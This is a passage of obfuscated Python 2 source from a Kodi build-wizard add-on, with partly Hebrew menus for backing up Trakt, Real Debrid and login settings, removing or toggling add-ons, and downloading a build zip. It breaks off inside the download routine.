	addFile ('%s שמירת פליליסט לאודר:  '%O00OO00O0O0O00OOO .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3170
	addFile ('%s שמירת הגדרות באפר: '%O0O00OO00O0O000O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3175
	addFile ('%s שמירת רשימות ריפו:  '%O0O0OOO00O000OO0O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3177
	setView ('files','viewType')#line:3179
def traktMenu ():#line:3181
	OOO000O0000OOOO0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3182
	O0OO0OOOO000OOO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3183
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	addFile ('Save Trakt Data: %s'%OOO000O0000OOOO0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3185
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0OO0OOOO000OOO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3186
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3187
	for OOO000O0000OOOO0O in traktit .ORDER :#line:3189
		O0O0O00O00000O000 =TRAKTID [OOO000O0000OOOO0O ]['name']#line:3190
		OO000O000OOO000OO =TRAKTID [OOO000O0000OOOO0O ]['path']#line:3191
		O0OOOOOOO0OO0O00O =TRAKTID [OOO000O0000OOOO0O ]['saved']#line:3192
		O00O0O000O00OO00O =TRAKTID [OOO000O0000OOOO0O ]['file']#line:3193
		O0O0000000OOO0OO0 =wiz .getS (O0OOOOOOO0OO0O00O )#line:3194
		OO0OO0OOOOOO0OO00 =traktit .traktUser (OOO000O0000OOOO0O )#line:3195
		O0OOOOO00OOOOOOOO =TRAKTID [OOO000O0000OOOO0O ]['icon']if os .path .exists (OO000O000OOO000OO )else ICONTRAKT #line:3196
		O0O00O000OOO00O0O =TRAKTID [OOO000O0000OOOO0O ]['fanart']if os .path .exists (OO000O000OOO000OO )else FANART #line:3197
		O000OOOO0O000OO0O =createMenu ('saveaddon','Trakt',OOO000O0000OOOO0O )#line:3198
		O00O0O0OO0000OOO0 =createMenu ('save','Trakt',OOO000O0000OOOO0O )#line:3199
		O000OOOO0O000OO0O .append ((THEME2 %'%s Settings'%O0O0O00O00000O000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO000O0000OOOO0O )))#line:3200
		addFile ('[+]-> %s'%O0O0O00O00000O000 ,'',icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,themeit =THEME3 )#line:3202
		if not os .path .exists (OO000O000OOO000OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O000OOOO0O000OO0O )#line:3203
		elif not OO0OO0OOOOOO0OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO000O0000OOOO0O ,icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O000OOOO0O000OO0O )#line:3204
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0OOOOOO0OO00 ,'authtrakt',OOO000O0000OOOO0O ,icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O000OOOO0O000OO0O )#line:3205
		if O0O0000000OOO0OO0 =="":#line:3206
			if os .path .exists (O00O0O000O00OO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO000O0000OOOO0O ,icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O00O0O0OO0000OOO0 )#line:3207
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO000O0000OOOO0O ,icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O00O0O0OO0000OOO0 )#line:3208
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0000000OOO0OO0 ,'',icon =O0OOOOO00OOOOOOOO ,fanart =O0O00O000OOO00O0O ,menu =O00O0O0OO0000OOO0 )#line:3209
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3211
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3214
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3215
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3216
	setView ('files','viewType')#line:3217
def realMenu ():#line:3219
	OO00O000O000O00OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3220
	O0OO0000000O00OOO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3221
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3222
	addFile ('Save Real Debrid Data: %s'%OO00O000O000O00OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3223
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO0000000O00OOO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3224
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3225
	for O0O00O0OO0O0OOOOO in debridit .ORDER :#line:3227
		OOOOOO00OO000OOO0 =DEBRIDID [O0O00O0OO0O0OOOOO ]['name']#line:3228
		OO0OOO00OO0OO0O0O =DEBRIDID [O0O00O0OO0O0OOOOO ]['path']#line:3229
		OOOOO00OOO0OOOO00 =DEBRIDID [O0O00O0OO0O0OOOOO ]['saved']#line:3230
		O0O00000OOOO0OO0O =DEBRIDID [O0O00O0OO0O0OOOOO ]['file']#line:3231
		OO00000OOOOOO00O0 =wiz .getS (OOOOO00OOO0OOOO00 )#line:3232
		O00OOO0O000O000O0 =debridit .debridUser (O0O00O0OO0O0OOOOO )#line:3233
		OO0O0O0OOOOOOOOO0 =DEBRIDID [O0O00O0OO0O0OOOOO ]['icon']if os .path .exists (OO0OOO00OO0OO0O0O )else ICONREAL #line:3234
		O0OOO0O0OO00O000O =DEBRIDID [O0O00O0OO0O0OOOOO ]['fanart']if os .path .exists (OO0OOO00OO0OO0O0O )else FANART #line:3235
		O0O0OO0OOO0OOOO0O =createMenu ('saveaddon','Debrid',O0O00O0OO0O0OOOOO )#line:3236
		O0OOOOOOOOOOO0000 =createMenu ('save','Debrid',O0O00O0OO0O0OOOOO )#line:3237
		O0O0OO0OOO0OOOO0O .append ((THEME2 %'%s Settings'%OOOOOO00OO000OOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O00O0OO0O0OOOOO )))#line:3238
		addFile ('[+]-> %s'%OOOOOO00OO000OOO0 ,'',icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,themeit =THEME3 )#line:3240
		if not os .path .exists (OO0OOO00OO0OO0O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0O0OO0OOO0OOOO0O )#line:3241
		elif not O00OOO0O000O000O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O00O0OO0O0OOOOO ,icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0O0OO0OOO0OOOO0O )#line:3242
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOO0O000O000O0 ,'authdebrid',O0O00O0OO0O0OOOOO ,icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0O0OO0OOO0OOOO0O )#line:3243
		if OO00000OOOOOO00O0 =="":#line:3244
			if os .path .exists (O0O00000OOOO0OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O00O0OO0O0OOOOO ,icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0OOOOOOOOOOO0000 )#line:3245
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O00O0OO0O0OOOOO ,icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0OOOOOOOOOOO0000 )#line:3246
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00000OOOOOO00O0 ,'',icon =OO0O0O0OOOOOOOOO0 ,fanart =O0OOO0O0OO00O000O ,menu =O0OOOOOOOOOOO0000 )#line:3247
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3249
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3252
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3253
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3254
	setView ('files','viewType')#line:3255
def loginMenu ():#line:3257
	O00000OOO0000OOO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3258
	OO00OOO0O0000O0OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3259
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	addFile ('Save Login Data: %s'%O00000OOO0000OOO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3261
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO00OOO0O0000O0OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3262
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3263
	for O00000OOO0000OOO0 in loginit .ORDER :#line:3265
		O0O0O000OO00O00O0 =LOGINID [O00000OOO0000OOO0 ]['name']#line:3266
		OO0O0O00OO000O000 =LOGINID [O00000OOO0000OOO0 ]['path']#line:3267
		O0OO00O000OOO0OO0 =LOGINID [O00000OOO0000OOO0 ]['saved']#line:3268
		O0O0O00OOO0O0O0OO =LOGINID [O00000OOO0000OOO0 ]['file']#line:3269
		OOOO0OOO00000000O =wiz .getS (O0OO00O000OOO0OO0 )#line:3270
		O0OO0OOOO0O00O00O =loginit .loginUser (O00000OOO0000OOO0 )#line:3271
		O0O00OOO0OO000OO0 =LOGINID [O00000OOO0000OOO0 ]['icon']if os .path .exists (OO0O0O00OO000O000 )else ICONLOGIN #line:3272
		O00OOO00OOOO000O0 =LOGINID [O00000OOO0000OOO0 ]['fanart']if os .path .exists (OO0O0O00OO000O000 )else FANART #line:3273
		OOOO0OOO0O0O0O00O =createMenu ('saveaddon','Login',O00000OOO0000OOO0 )#line:3274
		OO00OOOO0000O000O =createMenu ('save','Login',O00000OOO0000OOO0 )#line:3275
		OOOO0OOO0O0O0O00O .append ((THEME2 %'%s Settings'%O0O0O000OO00O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00000OOO0000OOO0 )))#line:3276
		addFile ('[+]-> %s'%O0O0O000OO00O00O0 ,'',icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,themeit =THEME3 )#line:3278
		if not os .path .exists (OO0O0O00OO000O000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OOOO0OOO0O0O0O00O )#line:3279
		elif not O0OO0OOOO0O00O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00000OOO0000OOO0 ,icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OOOO0OOO0O0O0O00O )#line:3280
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OO0OOOO0O00O00O ,'authlogin',O00000OOO0000OOO0 ,icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OOOO0OOO0O0O0O00O )#line:3281
		if OOOO0OOO00000000O =="":#line:3282
			if os .path .exists (O0O0O00OOO0O0O0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00000OOO0000OOO0 ,icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OO00OOOO0000O000O )#line:3283
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00000OOO0000OOO0 ,icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OO00OOOO0000O000O )#line:3284
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO0OOO00000000O ,'',icon =O0O00OOO0OO000OO0 ,fanart =O00OOO00OOOO000O0 ,menu =OO00OOOO0000O000O )#line:3285
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3287
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3290
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3291
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3292
	setView ('files','viewType')#line:3293
def fixUpdate ():#line:3295
	if KODIV <17 :#line:3296
		O0OOOOO00OOOO0OOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3297
		try :#line:3298
			os .remove (O0OOOOO00OOOO0OOO )#line:3299
		except Exception as OO0OO0OO00OOO0000 :#line:3300
			wiz .log ("Unable to remove %s, Purging DB"%O0OOOOO00OOOO0OOO )#line:3301
			wiz .purgeDb (O0OOOOO00OOOO0OOO )#line:3302
	else :#line:3303
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3304
def removeAddonMenu ():#line:3306
	OO00O0000OO000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3307
	OOOO0OO0O0O0O0O0O =[];O00OOOOOOO0O0000O =[]#line:3308
	for O0O0OOOO000O00OOO in sorted (OO00O0000OO000OO0 ,key =lambda O0O0OOO00O0OO0O0O :O0O0OOO00O0OO0O0O ):#line:3309
		OO00O0OOO00O0O00O =os .path .split (O0O0OOOO000O00OOO [:-1 ])[1 ]#line:3310
		if OO00O0OOO00O0O00O in EXCLUDES :continue #line:3311
		elif OO00O0OOO00O0O00O in DEFAULTPLUGINS :continue #line:3312
		elif OO00O0OOO00O0O00O =='packages':continue #line:3313
		O0O0000OO0O0000OO =os .path .join (O0O0OOOO000O00OOO ,'addon.xml')#line:3314
		if os .path .exists (O0O0000OO0O0000OO ):#line:3315
			OOO00OO00000OO000 =open (O0O0000OO0O0000OO )#line:3316
			OO000O0O000000O00 =OOO00OO00000OO000 .read ()#line:3317
			O00OO00OOO0O0OO0O =wiz .parseDOM (OO000O0O000000O00 ,'addon',ret ='id')#line:3318
			O000OO0000O0OO0OO =OO00O0OOO00O0O00O if len (O00OO00OOO0O0OO0O )==0 else O00OO00OOO0O0OO0O [0 ]#line:3320
			try :#line:3321
				OOO00O000O0O000OO =xbmcaddon .Addon (id =O000OO0000O0OO0OO )#line:3322
				OOOO0OO0O0O0O0O0O .append (OOO00O000O0O000OO .getAddonInfo ('name'))#line:3323
				O00OOOOOOO0O0000O .append (O000OO0000O0OO0OO )#line:3324
			except :#line:3325
				pass #line:3326
	if len (OOOO0OO0O0O0O0O0O )==0 :#line:3327
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3328
		return #line:3329
	if KODIV >16 :#line:3330
		O0O00OOOO0O00O00O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0OO0O0O0O0O0O )#line:3331
	else :#line:3332
		O0O00OOOO0O00O00O =[];OO00O000OO0OO0O0O =0 #line:3333
		OO0000O00OOO0O00O =["-- Click here to Continue --"]+OOOO0OO0O0O0O0O0O #line:3334
		while not OO00O000OO0OO0O0O ==-1 :#line:3335
			OO00O000OO0OO0O0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0000O00OOO0O00O )#line:3336
			if OO00O000OO0OO0O0O ==-1 :break #line:3337
			elif OO00O000OO0OO0O0O ==0 :break #line:3338
			else :#line:3339
				O0OO0O0OO0O0000OO =(OO00O000OO0OO0O0O -1 )#line:3340
				if O0OO0O0OO0O0000OO in O0O00OOOO0O00O00O :#line:3341
					O0O00OOOO0O00O00O .remove (O0OO0O0OO0O0000OO )#line:3342
					OO0000O00OOO0O00O [OO00O000OO0OO0O0O ]=OOOO0OO0O0O0O0O0O [O0OO0O0OO0O0000OO ]#line:3343
				else :#line:3344
					O0O00OOOO0O00O00O .append (O0OO0O0OO0O0000OO )#line:3345
					OO0000O00OOO0O00O [OO00O000OO0OO0O0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOO0OO0O0O0O0O0O [O0OO0O0OO0O0000OO ])#line:3346
	if O0O00OOOO0O00O00O ==None :return #line:3347
	if len (O0O00OOOO0O00O00O )>0 :#line:3348
		wiz .addonUpdates ('set')#line:3349
		for OOOO000OO0000OOO0 in O0O00OOOO0O00O00O :#line:3350
			removeAddon (O00OOOOOOO0O0000O [OOOO000OO0000OOO0 ],OOOO0OO0O0O0O0O0O [OOOO000OO0000OOO0 ],True )#line:3351
		xbmc .sleep (1000 )#line:3353
		if INSTALLMETHOD ==1 :OO000O000O0O0OO0O =1 #line:3355
		elif INSTALLMETHOD ==2 :OO000O000O0O0OO0O =0 #line:3356
		else :OO000O000O0O0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3357
		if OO000O000O0O0OO0O ==1 :wiz .reloadFix ('remove addon')#line:3358
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3359
def removeAddonDataMenu ():#line:3361
	if os .path .exists (ADDOND ):#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3363
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3364
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3365
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3366
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3367
		O0OO0O0OOO000O0O0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3368
		for O0OOOOOOO0O000000 in sorted (O0OO0O0OOO000O0O0 ,key =lambda O0O0O00OOOO0OOOO0 :O0O0O00OOOO0OOOO0 ):#line:3369
			OOOO0000O0O0O0O00 =O0OOOOOOO0O000000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3370
			O0O0O0OO0OOOO0000 =os .path .join (O0OOOOOOO0O000000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3371
			OO00O0OO0000OOOOO =os .path .join (O0OOOOOOO0O000000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3372
			O0O0O000O000000OO =OOOO0000O0O0O0O00 #line:3373
			O00OOO00OOO0000OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3374
			for OO0O0O0000OOO00OO in O00OOO00OOO0000OO :#line:3375
				O0O0O000O000000OO =O0O0O000O000000OO .replace (OO0O0O0000OOO00OO ,O00OOO00OOO0000OO [OO0O0O0000OOO00OO ])#line:3376
			if OOOO0000O0O0O0O00 in EXCLUDES :O0O0O000O000000OO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O0O000O000000OO #line:3377
			else :O0O0O000O000000OO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O0O000O000000OO #line:3378
			addFile (' %s'%O0O0O000O000000OO ,'removedata',OOOO0000O0O0O0O00 ,icon =O0O0O0OO0OOOO0000 ,fanart =OO00O0OO0000OOOOO ,themeit =THEME2 )#line:3379
	else :#line:3380
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3381
	setView ('files','viewType')#line:3382
def enableAddons ():#line:3384
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3385
	O0000OOOOOO00O0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3386
	O0O0000OOOOO0O0O0 =0 #line:3387
	for OO000O0000000O0OO in sorted (O0000OOOOOO00O0OO ,key =lambda O0OOO0O0O0000OOOO :O0OOO0O0O0000OOOO ):#line:3388
		OO00OOOO0OOO00OO0 =os .path .split (OO000O0000000O0OO [:-1 ])[1 ]#line:3389
		if OO00OOOO0OOO00OO0 in EXCLUDES :continue #line:3390
		if OO00OOOO0OOO00OO0 in DEFAULTPLUGINS :continue #line:3391
		OOO00000O0O0OOO00 =os .path .join (OO000O0000000O0OO ,'addon.xml')#line:3392
		if os .path .exists (OOO00000O0O0OOO00 ):#line:3393
			O0O0000OOOOO0O0O0 +=1 #line:3394
			O0000OOOOOO00O0OO =OO000O0000000O0OO .replace (ADDONS ,'')[1 :-1 ]#line:3395
			O00O00000000OO0O0 =open (OOO00000O0O0OOO00 )#line:3396
			OOO00OO00O0O0OO0O =O00O00000000OO0O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3397
			OO00OO0OOO0OO0O00 =wiz .parseDOM (OOO00OO00O0O0OO0O ,'addon',ret ='id')#line:3398
			O0O0O0O0O00O0OOO0 =wiz .parseDOM (OOO00OO00O0O0OO0O ,'addon',ret ='name')#line:3399
			try :#line:3400
				O0O00OO0000O00O0O =OO00OO0OOO0OO0O00 [0 ]#line:3401
				O0O000000O0O0000O =O0O0O0O0O00O0OOO0 [0 ]#line:3402
			except :#line:3403
				continue #line:3404
			try :#line:3405
				OOO0OO00O0O00OO00 =xbmcaddon .Addon (id =O0O00OO0000O00O0O )#line:3406
				O000O000000000OOO ="[COLOR green][Enabled][/COLOR]"#line:3407
				OO0OO0O000O0OO0OO ="false"#line:3408
			except :#line:3409
				O000O000000000OOO ="[COLOR red][Disabled][/COLOR]"#line:3410
				OO0OO0O000O0OO0OO ="true"#line:3411
				pass #line:3412
			O000O0O00O000000O =os .path .join (OO000O0000000O0OO ,'icon.png')if os .path .exists (os .path .join (OO000O0000000O0OO ,'icon.png'))else ICON #line:3413
			OO0OO0O000O0O0000 =os .path .join (OO000O0000000O0OO ,'fanart.jpg')if os .path .exists (os .path .join (OO000O0000000O0OO ,'fanart.jpg'))else FANART #line:3414
			addFile ("%s %s"%(O000O000000000OOO ,O0O000000O0O0000O ),'toggleaddon',O0000OOOOOO00O0OO ,OO0OO0O000O0OO0OO ,icon =O000O0O00O000000O ,fanart =OO0OO0O000O0O0000 )#line:3415
			O00O00000000OO0O0 .close ()#line:3416
	if O0O0000OOOOO0O0O0 ==0 :#line:3417
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3418
	setView ('files','viewType')#line:3419
def changeFeq ():#line:3421
	O0O00O00O0000OO00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3422
	OO0OOOOOOO0OOOOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O00O00O0000OO00 )#line:3423
	if not OO0OOOOOOO0OOOOOO ==-1 :#line:3424
		wiz .setS ('autocleanfeq',str (OO0OOOOOOO0OOOOOO ))#line:3425
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O00O00O0000OO00 [OO0OOOOOOO0OOOOOO ]))#line:3426
def developer ():#line:3428
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3429
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3430
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3431
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3432
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3433
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3434
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3435
	setView ('files','viewType')#line:3437
def download (O00O00O0O0O00OO00 ,OOOO0OOO0OOOOO0OO ):#line:3442
  OO0O00OOOOO0O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3443
  O000O0O0OOO0OOO0O =xbmcgui .DialogProgress ()#line:3444
  O000O0O0OOO0OOO0O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3445
  O0000O00O000OOO00 =os .path .join (OO0O00OOOOO0O0O00 ,'isr.zip')#line:3446
  O00O00OOOO00O0OO0 =urllib2 .Request (O00O00O0O0O00OO00 )#line:3447
  O00O0000OOOO0O00O =urllib2 .urlopen (O00O00OOOO00O0OO0 )#line:3448
  OOO0O0O000O0OO000 =xbmcgui .DialogProgress ()#line:3450
  OOO0O0O000O0OO000 .create ("Downloading","Downloading "+name )#line:3451
  OOO0O0O000O0OO000 .update (0 )#line:3452
  OOOOOO0OO0O00OOO0 =OOOO0OOO0OOOOO0OO #line:3453
  OOO00O0O00O0O00O0 =open (O0000O00O000OOO00 ,'wb')#line:3454
  try :#line:3456
    OO0O0OO00O0OOOOO0 =O00O0000OOOO0O00O .info ().getheader ('Content-Length').strip ()#line:3457
    O0O000000000OOO00 =True #line:3458
  except AttributeError :#line:3459
        O0O000000000OOO00 =False #line:3460
  if O0O000000000OOO00 :#line:3462
        OO0O0OO00O0OOOOO0 =int (OO0O0OO00O0OOOOO0 )#line:3463
  O0O0000O0O0OOOOOO =0 #line:3465
  OO00O000O0OOOO000 =time .time ()#line:3466
  while True :#line:3467
        O00O0OO0O000OO0O0 =O00O0000OOOO0O00O .read (8192 )#line:3468
        if not O00O0OO0O000OO0O0 :#line:3469
            sys .stdout .write ('\n')#line:3470
            break #line:3471
        O0O0000O0O0OOOOOO +=len (O00O0OO0O000OO0O0 )#line:3473
        OOO00O0O00O0O00O0 .write (O00O0OO0O000OO0O0 )#line:3474
        if not O0O000000000OOO00 :#line:3476
            OO0O0OO00O0OOOOO0 =O0O0000O0O0OOOOOO #line:3477
        if OOO0O0O000O0OO000 .iscanceled ():#line:3478
           OOO0O0O000O0OO000 .close ()#line:3479
           try :#line:3480
            os .remove (O0000O00O000OOO00 )#line:3481
           except :#line:3482
            pass #line:3483
           break #line:3484
        OO000OOOO00O0000O =float (O0O0000O0O0OOOOOO )/OO0O0OO00O0OOOOO0 #line:3485
        OO000OOOO00O0000O =round (OO000OOOO00O0000O *100 ,2 )#line:3486
        OO0O0OOO000OOO0OO =O0O0000O0O0OOOOOO /(1024 *1024 )#line:3487
        O0O0OO000O0OOOO0O =OO0O0OO00O0OOOOO0 /(1024 *1024 )#line:3488
        O0O000OOOO00OO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0OOO000OOO0OO ,'teal',O0O0OO000O0OOOO0O )#line:3489
        if (time .time ()-OO00O000O0OOOO000 )>0 :#line:3490
